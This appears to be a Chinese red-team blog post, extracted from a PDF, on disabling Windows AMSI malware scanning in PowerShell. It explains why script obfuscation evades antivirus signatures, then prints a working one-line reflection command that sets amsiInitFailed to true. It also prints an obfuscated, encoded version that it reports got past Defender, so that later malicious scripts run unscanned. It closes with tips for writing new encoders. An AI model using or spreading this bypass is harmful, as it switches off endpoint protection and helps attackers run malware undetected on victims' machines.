Bypass AMSI的前世今生(3) - 脚本混淆和一行命令关闭AMSI
0x00 前言
本文的主要讲解[BA2-3]，也就是脚本混淆和一行命令关闭AMSI的原理，而不是具体的脚本混淆方法。
混淆方法其实就是对脚本语法的理解，然后加入各种额外字符或换一种表示方法。混淆姿势细致繁复，
并且在网上已有比较全面的脑图和总结文章，在此就没必要重复了，相关推荐资料会在文末贴出。本文
主要分为以下几个部分：
为什么脚本混淆能够过AMSI
一行命令关闭AMSI原理
[BA2]和[BA3]配合达到关闭AMSI的作用
学习建议，工具和相关资料推荐
0x01 为什么脚本混淆能够过AMSI
“脚本混淆能够过AMSI”，这句话其实是不正确的，本系列第一篇文章中已经解释过了AMSI其实只是一个
通道，真正识别是否是恶意软件或脚本的还是杀毒软件（例如：defender）。因此脚本混淆欺骗的是杀
毒软件的特征库，当然具体杀毒软件怎么来识别有很多种方法。
AMSI把我们的恶意脚本交给杀毒软件，杀毒软件做识别。目前大部分的识别方式还是特征码的方式，当
然杀毒软件也会把样本传到云端做机器学习或者人工分析，最后再反馈特征库给杀毒软件，导致我们恶
意脚本被杀，这也就是为什么我们能过一时杀软但是几天后也就被杀了的原因。
“脚本混淆能够过AMSI”准确的说应该是“脚本混淆能够过杀毒”。因此脚本混淆能不能有用取决于杀软厉
不厉害。但当前脚本混淆依旧有用是因为大部分杀软对恶意脚本的侦测还是特征码。
0x02 一行命令关闭AMSI原理
通过0x01我们知道AMSI只是一个通道，我们把这个通道掐断，也就阻断了杀毒软件的侦测，而Matt 
Graeber在16年提出了一种方法：
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-22
No. 1 / 4 - Welcome to www.red-team.cn
原理已经被很多文章分析：https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-loggi
ng-evasion/，具体的小伙伴可以阅读以上文章，简单的说就是利用反射直接把判断是否要使用杀毒软件
进行扫描的变量始终改成false。这样AMSI就不会把我们的恶意脚本交给杀毒软件，而是直接返回
AMSI_RESULT_NOT_DETECTED 。
0x03 结合上面2种方法关闭AMSI
通过以上我们知道混淆是能够过杀毒软件的，通过“一行命令”是可以掐断AMSI通道了。由于这一行命令
也是脚本，自身会被AMSI传递给杀毒软件，并被查杀。因此我们结合以上2中方法，通过混淆“一行命
令”来过杀软，并掐断AMSI通道。这样我们再执行任何恶意脚本都不会被传递给杀毒。
下面我们来实践一下：
测试环境：
Windows 10 21H1（10.0.19043.1237）
Powershell 5.1.19041.1237
Defender 1.349.1192.0 (2021/09/22)
原始脚本：
根据这个脚本，如果把特征提取在函数上，很容易造成误报，因此很有可能特征是在
System.Management.Automation.AmsiUtils 和 amsiInitFailed 上，我们去掉测试一下。
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI
nitFailed','NonPublic,Static').SetValue($null,$true)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI
nitFailed','NonPublic,Static').SetValue($null,$true)
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-22
No. 2 / 4 - Welcome to www.red-team.cn
我偷个懒，前段时间在星球发了一个混淆脚本,但是目前已经不能过了：
我们对这个脚本进行拆解：
这段bypass的核心思想也就是对 System.Management.Automation.AmsiUtils 和 amsiInitFailed 的
关键字符进行编码解码。我只是对脚本进行了拆解，发现就已经能过了：
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+
($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char]
[int](29+($A+$B).substring(($_*2),2))})-replace " 
",'NonPublic,Static').SetValue($null,$true)
//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据
$a="5492868772801748688168747280728187173688878280688776828"
$b="1173680867656877679866880867644817687416876797271"
//对System.Management.Automation.AmsiUtils进行解码
$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$d=[Ref].Assembly.GetType($c)
//对amsiInitFailed进行解码
$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace " "
$f=$d.GetField($e,'NonPublic,Static')
//组合起来执行
$f.SetValue($null,$true)
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-22
No. 3 / 4 - Welcome to www.red-team.cn
0x04 学习建议
结合[BA2]和[BA3]是能够很好的bypass AMSI的，其中2个关键点：
找到查杀的关键字符，目前来看就是 System.Management.Automation.AmsiUtils 和
amsiInitFailed ，这个变动的可能不大，以后很长一段时间内都是这2个字符
自己编写一个编码解码方法，例如上文中的： [string](0..37|%{[char][int](29+
($a+$b).substring(($_*2),2))})-replace " "
我们要编写一个编码解码方法，肯定是需要一些powershell知识的，推荐一些学习资料：
https://docs.microsoft.com/zh-cn/powershell/scripting/learn/ps101/00-introduction?view=po
wershell-7.1
https://mp.weixin.qq.com/s/Sg0LK8emSWP1m-yds4VGrQ
其他可以google找找，很多很丰富。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-09-22
No. 4 / 4 - Welcome to www.red-team.cn